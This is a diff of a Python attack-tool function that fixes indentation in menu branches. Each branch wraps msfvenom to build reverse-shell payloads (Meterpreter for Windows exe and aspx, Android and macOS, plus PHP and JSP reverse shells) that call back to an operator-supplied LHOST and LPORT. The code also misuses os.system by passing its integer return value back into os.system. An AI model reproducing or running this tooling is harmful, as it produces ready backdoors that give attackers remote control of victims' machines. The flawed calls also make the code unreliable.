@@ -56,45 +56,45 @@ def msfvenom():
             LPORT = input(TextColors.CRIMSON + "ENTER THE LPORT : "+ TextColors.ESET)
             NAME = input(TextColors.CRIMSON + "ENTER THE PAYLOAD NAME (exe) : "+ TextColors.ESET)
 
-                commnad = os.system(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o {NAME}")
-                os.system(commnad)
-                print(TextColors.CYAN + f"[+] SUCCESSFULLY EXECUTED : ")
+            commnad = os.system(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o {NAME}")
+            os.system(commnad)
+            print(TextColors.CYAN + f"[+] SUCCESSFULLY EXECUTED : ")
                 
         if select == "3" or select == "3":
-                LHOST = input("ENTER THE LHOST : ")
-                LPORT = input("ENTER THE LPORT : ")
-                NAME = input("ENTER THE PAYLOAD NAME (.php) : ")
+            LHOST = input("ENTER THE LHOST : ")
+            LPORT = input("ENTER THE LPORT : ")
+            NAME = input("ENTER THE PAYLOAD NAME (.php) : ")
 
-                    commnad = os.system(f"msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -o {NAME}")
-                    os.system(commnad)
-                    print(f"[+] SUCCESSFULLY EXECUTED : ")  
+            commnad = os.system(f"msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -o {NAME}")
+            os.system(commnad)
+            print(f"[+] SUCCESSFULLY EXECUTED : ")  
 
         if select == "4" or select == "4":
             LHOST = input("ENTER THE LHOST : ")
             LPORT = input("ENTER THE LPORT : ")
             NAME = input("ENTER THE PAYLOAD NAME (.jsp) : ")
 
-                commnad = os.system(f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o {NAME}")
-                os.system(commnad)
-                print(f"[+] SUCCESSFULLY EXECUTED : ")
+            commnad = os.system(f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o {NAME}")
+            os.system(commnad)
+            print(f"[+] SUCCESSFULLY EXECUTED : ")
                          
         if select == "5" or select == "5":
             LHOST = input("ENTER THE LHOST : ")
             LPORT = input("ENTER THE LPORT : ")
             NAME = input("ENTER THE PAYLOAD NAME (.aspx) : ")
 
-                commnad = os.system(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx -o {NAME}")
-                os.system(commnad)
-                print(f"[+] SUCCESSFULLY EXECUTED : ")
+            commnad = os.system(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx -o {NAME}")
+            os.system(commnad)
+            print(f"[+] SUCCESSFULLY EXECUTED : ")
                            
         if select == "6" or select == "6":
             LHOST = input("ENTER THE LHOST : ")
             LPORT = input("ENTER THE LPORT : ")
             NAME = input("ENTER THE PAYLOAD NAME (.apk) : ")
 
-                commnad = os.system(f"msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={LHOST} lport={LPORT} R -o {NAME}")
-                os.system(commnad)
-                print(f"[+] SUCCESSFULLY EXECUTED : ")
+            commnad = os.system(f"msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={LHOST} lport={LPORT} R -o {NAME}")
+            os.system(commnad)
+            print(f"[+] SUCCESSFULLY EXECUTED : ")
 
         
         if select == "7" or select == "7":
@@ -102,7 +102,7 @@ def msfvenom():
             LPORT = input("ENTER THE LPORT : ")
             NAME = input("ENTER THE PAYLOAD NAME (.macho) : ")
 
-                commnad = os.system(f"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f macho -o {NAME}")
-                os.system(commnad)
-                print(f"[+] SUCCESSFULLY EXECUTED : ")
+            commnad = os.system(f"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f macho -o {NAME}")
+            os.system(commnad)
+            print(f"[+] SUCCESSFULLY EXECUTED : ")
 
